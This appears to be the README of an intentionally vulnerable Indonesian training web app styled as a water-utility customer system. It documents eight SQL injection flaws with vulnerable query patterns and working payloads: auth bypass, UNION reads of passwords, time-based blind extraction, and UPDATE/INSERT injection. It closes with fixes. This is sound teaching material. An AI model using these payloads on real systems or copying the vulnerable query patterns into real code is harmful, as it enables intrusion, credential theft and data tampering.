# PDAM Tirta Asasta Depok — Demo SQL Injection

> ⚠️ **Hanya untuk pembelajaran.**
> Proyek ini dibuat murni sebagai bahan latihan keamanan web (SQL Injection). Ini **bukan** aplikasi resmi, **bukan** produk, dan **tidak berafiliasi** dengan PDAM Tirta Asasta Depok atau perusahaan mana pun. Semua nama, data, akun, dan kredensial di sini adalah contoh/fiktif. Jangan dipakai di lingkungan produksi, dan jangan digunakan untuk aktivitas ilegal.

Ini aplikasi web sederhana berupa sistem informasi pelanggan PDAM. Semua celah SQL Injection di dalamnya **sengaja dibiarkan** supaya bisa dipelajari dan diuji langsung.

Aplikasi bisa dipakai dengan dua cara, dan keduanya memiliki celah yang sama:

- **Lewat browser** — halaman HTML yang dirender server (EJS), autentikasi memakai session cookie.
- **Lewat REST API** — endpoint JSON di bawah `/api/*`, autentikasi memakai Bearer token.

---

## Daftar Isi

- [Teknologi](#teknologi)
- [Menjalankan](#menjalankan)
- [Akun Demo](#akun-demo)
- [Struktur Database](#struktur-database)
- [Daftar Endpoint](#daftar-endpoint)
- [Skenario SQL Injection](#skenario-sql-injection)
- [Catatan](#catatan)

---

## Teknologi

| Bagian | Dipakai |
|--------|---------|
| Backend | Node.js + Express |
| Tampilan | EJS (server-side rendering) |
| Database | MySQL 8.0 (Docker) |
| Autentikasi | Session cookie untuk halaman, Bearer token untuk API |

---

## Menjalankan

### Cara cepat (Docker Compose)

Cara paling praktis — MySQL dan aplikasi langsung disiapkan sekaligus, termasuk inisialisasi database dari `db/init.sql`.

```bash
docker compose up -d --build
# → http://localhost:3000
```

Hentikan dengan:

```bash
docker compose down          # hentikan container
docker compose down -v       # hentikan + hapus data MySQL
```

### Cara manual (tanpa Docker)

Butuh MySQL 8.0 yang sudah berjalan di mesin lokal.

```bash
# 1. Install dependensi
npm install

# 2. Siapkan database (skema + data contoh)
mysql -u root -proot pdam_tirta_asasta < db/init.sql

# 3. Jalankan aplikasi
npm start
# → http://localhost:3000
```

Kalau MySQL dijalankan sebagai container terpisah:

```bash
docker run -d --name pdam-mysql \
  -e MYSQL_ROOT_PASSWORD=root \
  -e MYSQL_DATABASE=pdam_tirta_asasta \
  -p 3306:3306 \
  mysql:8.0
```

### Konfigurasi

Pengaturan diambil dari file `.env` di root proyek. Semua punya nilai default, jadi `.env` sifatnya opsional.

```env
DB_HOST=localhost
DB_PORT=3306
DB_USER=root
DB_PASSWORD=root
DB_NAME=pdam_tirta_asasta

PORT=3000
SESSION_SECRET=supersecretkey123
```

---

## Akun Demo

| Username | Password | Role |
|----------|----------|------|
| `admin` | `admin123` | admin |
| `operator1` | `op12345` | operator |
| `manager` | `manager123` | manager |

---

## Struktur Database

Tiga tabel utama:

- **`users`** — pegawai/admin. Kolom: `id`, `username`, `password`, `role` (`admin`/`operator`/`manager`), `nama_lengkap`, `created_at`.
- **`customers`** — data pelanggan. Kolom: `id`, `no_sambung`, `nama`, `alamat`, `kecamatan`, `kelurahan`, `golongan`, `tarif_per_m3`, `status`, `created_at`.
- **`bills`** — tagihan air bulanan. Kolom: `id`, `customer_id`, `bulan`, `tahun`, `pemakaian_m3`, `tagihan`, `denda`, `status_bayar`, `tgl_bayar`.

Skema lengkap dan data contoh ada di [`db/init.sql`](db/init.sql).

---

## Daftar Endpoint

### Halaman Web (HTML)

Selain `/` dan `/login`, semua route butuh login (session).

| Method | Route | Keterangan |
|--------|-------|------------|
| `GET` | `/` | Landing page + cek tagihan publik (`?no_sambung=`) |
| `GET` | `/login` | Form login |
| `POST` | `/login` | Proses login, buat session |
| `GET` | `/logout` | Hapus session |
| `GET` | `/dashboard` | Statistik ringkas |
| `GET` | `/customers` | Daftar & cari pelanggan (`?search=`) |
| `GET` | `/customer/:id` | Detail pelanggan + tagihan |
| `GET` | `/customer/:id/edit` | Form edit pelanggan |
| `POST` | `/customer/:id/edit` | Simpan perubahan pelanggan |
| `GET` | `/bill/:id` | Detail tagihan |
| `GET` | `/bill/:id/pay` | Halaman pembayaran |
| `POST` | `/bill/:id/pay` | Proses pembayaran |
| `GET` | `/meter` | Form input meter bulanan |
| `POST` | `/meter` | Simpan tagihan baru |
| `GET` | `/export` | Export tabel sebagai teks/CSV (`?table=`) |

### REST API (JSON)

Semua endpoint butuh header `Authorization: Bearer <token>`, kecuali `/api/login` dan `/api/cek-tagihan`.

| Method | Endpoint | Auth | Keterangan |
|--------|----------|------|------------|
| `POST` | `/api/login` | ❌ | Login, dapat token |
| `POST` | `/api/logout` | ✅ | Hapus token |
| `GET` | `/api/customers` | ✅ | Daftar & cari pelanggan (`?search=`) |
| `GET` | `/api/customers/:id` | ✅ | Detail pelanggan + tagihan |
| `PUT` | `/api/customers/:id` | ✅ | Update data pelanggan |
| `GET` | `/api/bills/:id` | ✅ | Detail tagihan |
| `PUT` | `/api/bills/:id/pay` | ✅ | Bayar tagihan |
| `GET` | `/api/export` | ✅ | Export tabel (`?table=`) |
| `GET` | `/api/cek-tagihan` | ❌ | Cek tagihan publik (`?no_sambung=`) |
| `POST` | `/api/meter` | ✅ | Input meter bulanan |

---

## Skenario SQL Injection

Ringkasan celah yang disengaja:

| # | Titik rawan | Jenis | Dampak |
|---|-------------|-------|--------|
| 1 | `POST /login` · `POST /api/login` | Auth bypass | Login tanpa password |
| 2 | `/customers?search=` | UNION-based | Baca tabel lain (mis. `users`) |
| 3 | `/bill/:id` · `/bills/:id` | Time-based blind | Ekstraksi data per karakter |
| 4 | `/export?table=` | String concatenation | Akses tabel mana pun |
| 5 | `PUT /api/customers/:id` | UPDATE injection | Ubah data pelanggan lain |
| 6 | `/bill/:id/pay` · `/bills/:id/pay` | UPDATE injection | Ubah banyak tagihan sekaligus |
| 7 | `/` · `/api/cek-tagihan` | UNION / blind | Bocor tanpa login |
| 8 | `POST /meter` · `POST /api/meter` | INSERT + subquery | Sisipkan hasil query ke kolom |

> Contoh perintah memakai variabel `$TOKEN`. Isi dulu dengan token dari login:
> ```bash
> TOKEN=$(curl -s -X POST http://localhost:3000/api/login \
>   -H 'Content-Type: application/json' \
>   -d '{"username":"admin","password":"admin123"}' | jq -r .token)
> ```

---

### 1. Login Bypass (Auth Bypass)

**Route:** `POST /login`, `POST /api/login`

**Kode rentan:**

```sql
SELECT * FROM users WHERE username = '${username}' AND password = '${password}'
```

**Payload:**

```bash
curl -X POST http://localhost:3000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"'"'"' OR 1=1 -- ","password":"sembarang"}'
```

Query yang terbentuk:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = 'sembarang'
```

`1=1` selalu benar dan `--` mengabaikan sisa query, sehingga login berhasil sebagai `admin` tanpa tahu password-nya.

---

### 2. UNION Injection — Baca Tabel `users`

**Route:** `GET /api/customers?search=` (versi halaman: `GET /customers?search=`)

**Kode rentan:**

```sql
SELECT * FROM customers WHERE nama LIKE '%${search}%' OR no_sambung LIKE '%${search}%'
```

**Payload:**

```bash
curl -s "http://localhost:3000/api/customers?search=' UNION SELECT id,username,password,role,nama_lengkap,6,7,8,9,10 FROM users -- " \
  -H "Authorization: Bearer $TOKEN" | jq
```

Tabel `customers` punya 10 kolom (`id, no_sambung, nama, alamat, kecamatan, kelurahan, golongan, tarif_per_m3, status, created_at`), jadi jumlah kolom pada `UNION SELECT` harus 10. Hasilnya, `username` dan `password` pegawai muncul di response.

---

### 3. Time-Based Blind SQLi

**Route:** `GET /api/bills/:id` (versi halaman: `GET /bill/:id`)

**Kode rentan:**

```sql
SELECT b.*, c.nama, c.no_sambung FROM bills b
JOIN customers c ON b.customer_id = c.id
WHERE b.id = ${id}
```

**Konfirmasi** — bandingkan waktu respons antara kondisi benar dan salah:

```bash
# Benar → respons tertunda ±2 detik
time curl -s "http://localhost:3000/api/bills/1 AND IF(1=1,SLEEP(2),0)" -H "Authorization: Bearer $TOKEN"

# Salah → respons instan
time curl -s "http://localhost:3000/api/bills/1 AND IF(1=2,SLEEP(2),0)" -H "Authorization: Bearer $TOKEN"
```

**Ekstraksi karakter per karakter** — contoh menebak huruf pertama password `admin`:

```bash
time curl -s "http://localhost:3000/api/bills/1 AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a',SLEEP(2),0)" \
  -H "Authorization: Bearer $TOKEN"
```

Delay muncul hanya ketika tebakan benar, sehingga data bisa dibaca satu karakter demi satu karakter.

---

### 4. Table Injection pada Export

**Route:** `GET /api/export?table=` (versi halaman: `GET /export?table=`)

**Kode rentan:**

```sql
SELECT * FROM ${table}
```

**Payload:**

```bash
curl -s "http://localhost:3000/api/export?table=users" -H "Authorization: Bearer $TOKEN" | jq
```

Nama tabel ditempel langsung ke query, sehingga tabel apa pun bisa diekspor — termasuk `users`. Bisa digabung dengan `WHERE` atau `UNION`.

---

### 5. UPDATE Injection — Ubah Data Pelanggan Lain

**Route:** `PUT /api/customers/:id` (versi halaman: `POST /customer/:id/edit`)

**Body:** `{ "nama", "alamat", "kecamatan", "kelurahan", "golongan", "status" }`

**Kode rentan:**

```sql
UPDATE customers SET nama='${nama}', alamat='${alamat}', kecamatan='${kecamatan}',
kelurahan='${kelurahan}', golongan='${golongan}', status='${status}' WHERE id = ${id}
```

**Payload** — isi field `nama` dengan klausa tambahan:

```bash
curl -X PUT http://localhost:3000/api/customers/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"nama":"x","status":"nonaktif" WHERE id=2 -- ","alamat":"x","kecamatan":"x","kelurahan":"x","golongan":"R1"}'
```

Query yang terbentuk:

```sql
UPDATE customers SET nama='x', status='nonaktif' WHERE id=2 -- ', alamat='x', ... WHERE id = 1
```

Pelanggan ID 2 ikut terubah, padahal request ditujukan ke ID 1.

---

### 6. UPDATE Injection — Bayar Semua Tagihan

**Route:** `PUT /api/bills/:id/pay` (versi halaman: `POST /bill/:id/pay`)

**Kode rentan:**

```sql
UPDATE bills SET status_bayar='lunas', tgl_bayar=CURDATE() WHERE id = ${id}
```

**Payload:**

```bash
curl -s -X PUT "http://localhost:3000/api/bills/1 OR 1=1" -H "Authorization: Bearer $TOKEN"
```

Query yang terbentuk:

```sql
UPDATE bills SET status_bayar='lunas', tgl_bayar=CURDATE() WHERE id = 1 OR 1=1
```

Karena `1=1` selalu benar, seluruh tagihan di database berubah menjadi lunas.

---

### 7. Cek Tagihan Publik — Tanpa Login

**Route:** `GET /?no_sambung=` (versi API: `GET /api/cek-tagihan?no_sambung=`)

**Kode rentan:**

```sql
SELECT b.*, c.nama, c.alamat, c.kecamatan FROM bills b
JOIN customers c ON b.customer_id = c.id
WHERE c.no_sambung = '${no_sambung}'
```

Endpoint ini **tidak butuh login**, jadi siapa pun bisa mengaksesnya.

**Payload — UNION injection:**

```
?no_sambung=' UNION SELECT id,username,password,4,5,6,7,8,9,10,11,12 FROM users -- 
```

**Payload — blind SQLi via delay:**

```
?no_sambung=TA2023001' AND IF(1=1,SLEEP(2),0) -- 
```

---

### 8. INSERT Injection — Input Meter Bulanan

**Route:** `POST /api/meter` (versi halaman: `POST /meter`)

**Body:** `{ "customer_id", "bulan", "tahun", "pemakaian_m3" }`

**Kode rentan:**

```sql
INSERT INTO bills (customer_id, bulan, tahun, pemakaian_m3, tagihan, status_bayar)
SELECT ${customer_id}, ${bulan}, ${tahun}, ${pemakaian_m3}, ${pemakaian_m3} * tarif_per_m3, 'belum'
FROM customers WHERE id = ${customer_id}
```

Semua field dari body ditempel langsung tanpa parameterized query.

**Payload — input normal:**

```bash
curl -X POST http://localhost:3000/api/meter \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"customer_id":1,"bulan":11,"tahun":2026,"pemakaian_m3":"999"}'
```

**Payload — menyisipkan subquery ke kolom `pemakaian_m3`:**

```bash
curl -X POST http://localhost:3000/api/meter \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"customer_id":"1","bulan":11,"tahun":2026,"pemakaian_m3":"(SELECT password FROM users WHERE id=1)"}'
```

Query yang terbentuk:

```sql
INSERT INTO bills ... SELECT 1, 11, 2026, (SELECT password FROM users WHERE id=1), ..., 'belum' FROM customers WHERE id = 1
```

Password `admin` tersimpan sebagai pemakaian dan bisa dibaca di detail tagihan.

---

## Catatan

Seluruh SQL di aplikasi ini dibuat dengan penggabungan string, bukan prepared statement / parameterized query — itulah akar semua celah di atas. Kalau ingin mempelajari sisi pertahanannya, bandingkan dengan pola yang sudah benar di `app.js`, misalnya query tagihan pada endpoint detail pelanggan yang memakai placeholder `?`.

Perbaikan kiranya: gunakan parameterized query (`pool.query(sql, [params])`), validasi `:id` agar berupa angka, dan whitelist nama tabel untuk export.

Dokumen pendamping (langkah deploy dan pembahasan SQLi) ada di [`deploy-and-sqli.md`](deploy-and-sqli.md) dan [`deploy-and-sqli.pdf`](deploy-and-sqli.pdf).

> ⚠️ Sekali lagi: aplikasi ini sengaja rentan. Jangan pernah meniru polanya di lingkungan production.
